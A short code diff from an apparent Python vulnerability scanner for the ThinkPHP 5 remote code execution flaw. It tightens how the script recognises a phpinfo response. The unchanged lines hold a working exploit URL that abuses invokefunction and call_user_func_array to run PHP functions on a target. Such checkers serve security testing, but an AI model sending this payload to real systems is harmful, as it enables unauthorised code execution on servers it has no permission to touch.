@@ -36,7 +36,7 @@ def ThinkPHP5(url):
         vurl = urllib.parse.urljoin(url, 'index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1')
         print(vurl)
         req = requests.get(vurl,headers=headers, timeout=15, verify=False)
-        if 'PHP License' in req.text:
+        if 'phpinfo()' in req.text and 'PHP Version' in req.text and 'www.php.net' in req.text:
             pocdict['isvul'] = True
             pocdict['vulnurl'] = vurl
             #pocdict['response'] = req.text
